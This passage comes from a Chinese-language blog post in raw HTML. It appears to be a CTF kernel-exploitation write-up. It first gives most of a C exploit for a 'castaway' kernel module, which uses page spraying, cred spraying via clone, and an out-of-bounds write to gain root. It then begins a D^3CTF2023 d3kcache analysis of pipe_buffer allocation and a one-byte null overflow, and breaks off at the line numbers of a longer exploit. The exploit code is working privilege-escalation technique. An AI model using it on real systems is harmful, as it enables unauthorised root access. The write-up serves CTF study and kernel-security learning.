function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot; mov r15, rsi; &quot;</span>   <span class="comment">/* save the rsi*/</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; xor rsi, rsi; &quot;</span>   <span class="comment">/* set esp and useless args to NULL */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; xor rdx, rdx; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; xor r10, r10; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; xor r8, r8;   &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; xor r9, r9;   &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; mov rax, 56;  &quot;</span>   <span class="comment">/* __NR_clone */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; syscall;      &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; cmp rax, 0;   &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; je child_fn;  &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; ret;          &quot;</span>   <span class="comment">/* parent */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;child_fn:      &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; jmp r15;      &quot;</span>   <span class="comment">/* child */</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_page</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">free_page</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_cmd_handler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">            ret = create_socket_and_alloc_pages(<span class="number">0x1000</span>, <span class="number">1</span>);</span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">            ret = close(socket_fd[req.idx]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> aragc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    <span class="type">char</span> th_stack[<span class="number">0x1000</span>], buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* to run the exp on the specific core only */</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/castaway&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to open castaway device!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* use a new process for page spraying */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make buddy&#x27;s lower order clean, castaway_requesting from higher */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spraying pgv pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(alloc_page(i) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at no.%d socket\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to spray pages via socket!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free pages for cred */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] freeing for cred pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>)&#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray cred to get the isolate pages we released before */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spraying cred...&quot;</span>);</span><br><span class="line">    pipe(check_root_pipe);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CRED_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, </span><br><span class="line">                         waiting_for_root_fn) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at cloning %d child\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to clone()!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free pages for our vulerable objects */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] freeing for vulnerable pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>)&#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray vulnerable objects, hope that we can make an oob-write to cred */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring vulnerability in castaway kernel module...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="type">uint32_t</span>*) &amp;buf[VUL_OBJ_SIZE - <span class="number">6</span>] = <span class="number">1</span>;    <span class="comment">/* cred-&gt;usage */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; VUL_OBJ_NUM; i++) &#123;</span><br><span class="line">        alloc();</span><br><span class="line">        edit(i, VUL_OBJ_SIZE, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* checking privilege in child processes */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] notifying child processes and waiting...&quot;</span>);</span><br><span class="line">    write(check_root_pipe[<span class="number">1</span>], buf, CRED_SPRAY_NUM);</span><br><span class="line">    sleep(<span class="number">1145141919</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与用户态能够较为精准的控制我们所需要的数据结构不同</p><p>内核态要复杂的多,其中存在着大量的噪声操作干扰我们的控制,因此无法做到准确的控制</p><p>因此在内核态的利用中,我们需要大量地重复某一个操作,以希望其中某一个能够成功命中</p><h1 id="D-3CTF2023-d3kcache"><a href="#D-3CTF2023-d3kcache" class="headerlink" title="D^3CTF2023 - d3kcache"></a>D^3CTF2023 - d3kcache</h1><p>文件系统是ext4,解压出来后发现没有init脚本</p><p>对文件系统不太了解,先不管了</p><p>启动脚本可以看到开启了kaslr,kpti,smap,smep默认应该也是开启的</p><h2 id="fcntl-F-SETPIPE-SZ"><a href="#fcntl-F-SETPIPE-SZ" class="headerlink" title="fcntl(F_SETPIPE_SZ)"></a>fcntl(F_SETPIPE_SZ)</h2><p>之前一直感到疑惑pipe_buffer结构体大小只有<code>0x28</code>,为什么是从<code>kmalloc-cg-1k</code>获得object</p><p>注意到pipe_buffer的分配过程中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;wait);</span><br><span class="line">pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">pipe-&gt;buffers = pipe_bufs;</span><br><span class="line">pipe-&gt;user = user;</span><br><span class="line">mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line"><span class="keyword">return</span> pipe;</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pipe-&gt;bufs实际上是一个pipe_buffer结构体数组,其默认会分配<code>PIPE_DEF_BUFFERS(其值默认为16)</code>个pipe_buffer</p><p>大小为640,故属于<code>kmalloc-cg-1k</code></p><p>存在一个系统调用fcntl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">    pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">    __pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">        ret = pipe_set_size(pipe, arg);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size, nr_pages;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = round_pipe_size(arg);</span><br><span class="line">nr_pages = size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If trying to increase the pipe capacity, check that an</span></span><br><span class="line"><span class="comment"> * unprivileged user is not trying to exceed various limits</span></span><br><span class="line"><span class="comment"> * (soft limit check here, hard limit check just below).</span></span><br><span class="line"><span class="comment"> * Decreasing the pipe capacity is always permitted, even</span></span><br><span class="line"><span class="comment"> * if the user is currently over a limit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nr_pages &gt; pipe-&gt;buffers &amp;&amp;</span><br><span class="line">size &gt; pipe_max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">user_bufs = account_pipe_buffers(pipe-&gt;user, pipe-&gt;buffers, nr_pages);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nr_pages &gt; pipe-&gt;buffers &amp;&amp;</span><br><span class="line">(too_many_pipe_buffers_hard(user_bufs) ||</span><br><span class="line"> too_many_pipe_buffers_soft(user_bufs)) &amp;&amp;</span><br><span class="line">is_unprivileged_user()) &#123;</span><br><span class="line">ret = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We can shrink the pipe, if arg &gt;= pipe-&gt;nrbufs. Since we don&#x27;t</span></span><br><span class="line"><span class="comment"> * expect a lot of shrink+grow operations, just free and allocate</span></span><br><span class="line"><span class="comment"> * again like we would do for growing. If the pipe currently</span></span><br><span class="line"><span class="comment"> * contains more buffers than arg, then return busy.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nr_pages &lt; pipe-&gt;nrbufs) &#123;</span><br><span class="line">ret = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bufs = kcalloc(nr_pages, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!bufs)) &#123;</span><br><span class="line">ret = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The pipe array wraps around, so just start the new one at zero</span></span><br><span class="line"><span class="comment"> * and adjust the indexes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;nrbufs) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"></span><br><span class="line">tail = pipe-&gt;curbuf + pipe-&gt;nrbufs;</span><br><span class="line"><span class="keyword">if</span> (tail &lt; pipe-&gt;buffers)</span><br><span class="line">tail = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">tail &amp;= (pipe-&gt;buffers - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;nrbufs - tail;</span><br><span class="line"><span class="keyword">if</span> (head)</span><br><span class="line"><span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + pipe-&gt;curbuf, head * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"><span class="keyword">if</span> (tail)</span><br><span class="line"><span class="built_in">memcpy</span>(bufs + head, pipe-&gt;bufs, tail * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;curbuf = <span class="number">0</span>;</span><br><span class="line">kfree(pipe-&gt;bufs);</span><br><span class="line">pipe-&gt;bufs = bufs;</span><br><span class="line">pipe-&gt;buffers = nr_pages;</span><br><span class="line"><span class="keyword">return</span> nr_pages * PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="type">void</span>) account_pipe_buffers(pipe-&gt;user, nr_pages, pipe-&gt;buffers);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当选项为<code>F_SETPIPE_SZ</code></p><p>其会修改当前pipe的bufs数组大小为第三个参数(arg&gt;&gt;12)*sizeof(*bufs)</p><p>例如当我们使用<code>fcntl(pipe_fd, F_SETPIPE_SZ, 0x1000 * 64)</code>时</p><p>就会更改bufs从<code>kmalloc-cg-2k</code>进行分配</p><h2 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h2><p>在模块初始化的时候创建了一个kmem_cache,大小为2048,并且开启了SLAB_ACCOUNT标志位</p><p>自定义的 ioctl 函数提供了分配、追加编辑、释放、读取的一个堆菜单，漏洞便出在追加编辑当中，当写满 2048 字节时存在着一个 <code>\0</code> 字节的溢出：</p><p>目标是利用这一个零字节的溢出修改<code>pipe_buffer</code>结构体page指针,使得两个<code>pipe_buffer</code>指向同一个<code>struct page</code>,进而使得两个<code>pipe_buffer</code>使用同一个物理页框</p><p>arttnba3大佬在该利用基础上提供了三种解题方法</p><p>一千多行的<strong>exp:</strong>理解有点困难,暂时先放一放</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span 